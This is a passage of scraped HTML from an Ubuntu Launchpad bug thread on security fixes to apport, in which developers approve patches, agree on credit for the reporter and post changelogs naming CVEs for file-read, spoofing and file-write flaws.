+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/21"> #21</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>The debdiff for hirsute looks good to me, thanks! Could this error message be more specific though?</p>
+<p>+            return &#x27;Error: could not open file!&#x27;</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">The debdiff for hirsute looks good to me, thanks! Could this error message be more specific though?
+
++            return 'Error: could not open file!'
+</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/22" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T22:44:33.812403+00:00" title="2021-05-13 22:44:33 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/22"> #22</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sure...do you have a suggestion?</p>
+<p>How about &quot;Error: path was not a regular file.&quot;</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Sure...do you have a suggestion?
+
+How about "Error: path was not a regular file."</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/23" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~brian-murray" class="sprite person">Brian Murray (brian-murray)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-13T23:08:53.023626+00:00" title="2021-05-13 23:08:53 UTC">on 2021-05-13</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/23"> #23</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>That sounds like an accurate description to me!</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">That sounds like an accurate description to me!</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/24" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mallle" class="sprite person">mal (mallle)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-14T08:23:17.976179+00:00" title="2021-05-14 08:23:17 UTC">on 2021-05-14</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/24"> #24</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>The patches look good to me.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">The patches look good to me.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/25" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-17T14:26:09.134854+00:00" title="2021-05-17 14:26:09 UTC">on 2021-05-17</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/25"> #25</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>We will be publishing these updates on 2021-05-25. Thanks!</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">We will be publishing these updates on 2021-05-25. Thanks!</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/26" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-17T14:30:07.505304+00:00" title="2021-05-17 14:30:07 UTC">on 2021-05-17</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/26"> #26</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>We have a policy of only crediting real names in our USN texts. Do you want me to credit you as &quot;Maik&quot;, or do you have a full name I should use?</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">We have a policy of only crediting real names in our USN texts. Do you want me to credit you as "Maik", or do you have a full name I should use?</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/27" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-17T14:31:13.826221+00:00" title="2021-05-17 14:31:13 UTC">on 2021-05-17</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/27"> #27</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>(I will use &quot;&lt;email address hidden&gt; (@fktio)&quot; in our CVE tracker)</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">(I will use "maik@secfault-security.com (@fktio)" in our CVE tracker)</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+    
+    <time title="2021-05-25 16:42:41 UTC" datetime="2021-05-25T16:42:41.211297+00:00">on 2021-05-25</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>no longer affects</b>:
+      </td>
+      <td>
+        openjdk-lts (Ubuntu)
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/29" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-25T16:44:21.173422+00:00" title="2021-05-25 16:44:21 UTC">on 2021-05-25</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/29"> #29</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apport - 2.20.11-0ubuntu65.1</p>
+<p>---------------<br />
+apport (2.20.11-<wbr />0ubuntu65.<wbr />1) hirsute-security; urgency=medium</p>
+<p>&nbsp;&nbsp;* SECURITY UPDATE: Multiple arbitrary file reads (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- apport/<wbr />hookutils.<wbr />py: don&#x27;t follow symlinks and make sure the file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isn&#x27;t a FIFO in read_file().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- test/test_<wbr />hookutils.<wbr />py: added symlink tests.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32555<br />
+&nbsp;&nbsp;* SECURITY UPDATE: info disclosure via modified config files spoofing<br />
+&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- backends/<wbr />packaging-<wbr />apt-dpkg.<wbr />py: properly terminate arguments in<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get_<wbr />modified_<wbr />conffiles.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32556<br />
+&nbsp;&nbsp;* SECURITY UPDATE: arbitrary file write (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- data/whoopsie-<wbr />upload-<wbr />all: don&#x27;t follow symlinks and make sure the<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file isn&#x27;t a FIFO in process_report().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32557</p>
+<p>&nbsp;-- Marc Deslauriers &lt;email address hidden&gt;  Tue, 18 May 2021 09:15:10 -0400</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">This bug was fixed in the package apport - 2.20.11-0ubuntu65.1
+
+---------------
+apport (2.20.11-0ubuntu65.1) hirsute-security; urgency=medium
+
+  * SECURITY UPDATE: Multiple arbitrary file reads (LP: #1917904)
+    - apport/hookutils.py: don't follow symlinks and make sure the file
+      isn't a FIFO in read_file().
+    - test/test_hookutils.py: added symlink tests.
+    - CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,
+      CVE-2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,
+      CVE-2021-32555
+  * SECURITY UPDATE: info disclosure via modified config files spoofing
+    (LP: #1917904)
+    - backends/packaging-apt-dpkg.py: properly terminate arguments in
+      get_modified_conffiles.
+    - CVE-2021-32556
+  * SECURITY UPDATE: arbitrary file write (LP: #1917904)
+    - data/whoopsie-upload-all: don't follow symlinks and make sure the
+      file isn't a FIFO in process_report().
+    - CVE-2021-32557
+
+ -- Marc Deslauriers &lt;marc.deslauriers@ubuntu.com&gt;  Tue, 18 May 2021 09:15:10 -0400</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Hirsute): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/30" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-25T16:44:24.946217+00:00" title="2021-05-25 16:44:24 UTC">on 2021-05-25</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/30"> #30</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apport - 2.20.9-0ubuntu7.24</p>
+<p>---------------<br />
+apport (2.20.9-<wbr />0ubuntu7.<wbr />24) bionic-security; urgency=medium</p>
+<p>&nbsp;&nbsp;* SECURITY UPDATE: Multiple arbitrary file reads (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- apport/<wbr />hookutils.<wbr />py: don&#x27;t follow symlinks and make sure the file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isn&#x27;t a FIFO in read_file().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- test/test_<wbr />hookutils.<wbr />py: added symlink tests.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32555<br />
+&nbsp;&nbsp;* SECURITY UPDATE: info disclosure via modified config files spoofing<br />
+&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- backends/<wbr />packaging-<wbr />apt-dpkg.<wbr />py: properly terminate arguments in<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get_<wbr />modified_<wbr />conffiles.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32556<br />
+&nbsp;&nbsp;* SECURITY UPDATE: arbitrary file write (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- data/whoopsie-<wbr />upload-<wbr />all: don&#x27;t follow symlinks and make sure the<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file isn&#x27;t a FIFO in process_report().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32557</p>
+<p>&nbsp;-- Marc Deslauriers &lt;email address hidden&gt;  Tue, 18 May 2021 09:15:10 -0400</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">This bug was fixed in the package apport - 2.20.9-0ubuntu7.24
+
+---------------
+apport (2.20.9-0ubuntu7.24) bionic-security; urgency=medium
+
+  * SECURITY UPDATE: Multiple arbitrary file reads (LP: #1917904)
+    - apport/hookutils.py: don't follow symlinks and make sure the file
+      isn't a FIFO in read_file().
+    - test/test_hookutils.py: added symlink tests.
+    - CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,
+      CVE-2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,
+      CVE-2021-32555
+  * SECURITY UPDATE: info disclosure via modified config files spoofing
+    (LP: #1917904)
+    - backends/packaging-apt-dpkg.py: properly terminate arguments in
+      get_modified_conffiles.
+    - CVE-2021-32556
+  * SECURITY UPDATE: arbitrary file write (LP: #1917904)
+    - data/whoopsie-upload-all: don't follow symlinks and make sure the
+      file isn't a FIFO in process_report().
+    - CVE-2021-32557
+
+ -- Marc Deslauriers &lt;marc.deslauriers@ubuntu.com&gt;  Tue, 18 May 2021 09:15:10 -0400</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in apport (Ubuntu Bionic): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/31" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-25T16:45:40.233181+00:00" title="2021-05-25 16:45:40 UTC">on 2021-05-25</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/31"> #31</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apport - 2.20.11-0ubuntu50.7</p>
+<p>---------------<br />
+apport (2.20.11-<wbr />0ubuntu50.<wbr />7) groovy-security; urgency=medium</p>
+<p>&nbsp;&nbsp;* SECURITY UPDATE: Multiple arbitrary file reads (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- apport/<wbr />hookutils.<wbr />py: don&#x27;t follow symlinks and make sure the file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isn&#x27;t a FIFO in read_file().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- test/test_<wbr />hookutils.<wbr />py: added symlink tests.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-<wbr />2021-32555<br />
+&nbsp;&nbsp;* SECURITY UPDATE: info disclosure via modified config files spoofing<br />
+&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- backends/<wbr />packaging-<wbr />apt-dpkg.<wbr />py: properly terminate arguments in<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get_<wbr />modified_<wbr />conffiles.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32556<br />
+&nbsp;&nbsp;* SECURITY UPDATE: arbitrary file write (LP: <a href="/bugs/1917904" class="bug-link">#1917904</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- data/whoopsie-<wbr />upload-<wbr />all: don&#x27;t follow symlinks and make sure the<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file isn&#x27;t a FIFO in process_report().<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2021-32557</p>
+<p>&nbsp;-- Marc Deslauriers &lt;email address hidden&gt;  Tue, 18 May 2021 09:15:10 -0400</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">This bug was fixed in the package apport - 2.20.11-0ubuntu50.7
+
+---------------
+apport (2.20.11-0ubuntu50.7) groovy-security; urgency=medium
+
+  * SECURITY UPDATE: Multiple arbitrary file reads (LP: #1917904)
+    - apport/hookutils.py: don't follow symlinks and make sure the file
+      isn't a FIFO in read_file().
+    - test/test_hookutils.py: added symlink tests.
+    - CVE-2021-32547, CVE-2021-32548, CVE-2021-32549, CVE-2021-32550,
+      CVE-2021-32551, CVE-2021-32552, CVE-2021-32553, CVE-2021-32554,
+      CVE-2021-32555
+  * SECURITY UPDATE: info disclosure via modified config files spoofing
+    (LP: #1917904)
+    - backends/packaging-apt-dpkg.py: properly terminate arguments in
+      get_modified_conffiles.
+    - CVE-2021-32556
+  * SECURITY UPDATE: arbitrary file write (LP: #1917904)
+    - data/whoopsie-upload-all: don't follow symlinks and make sure the
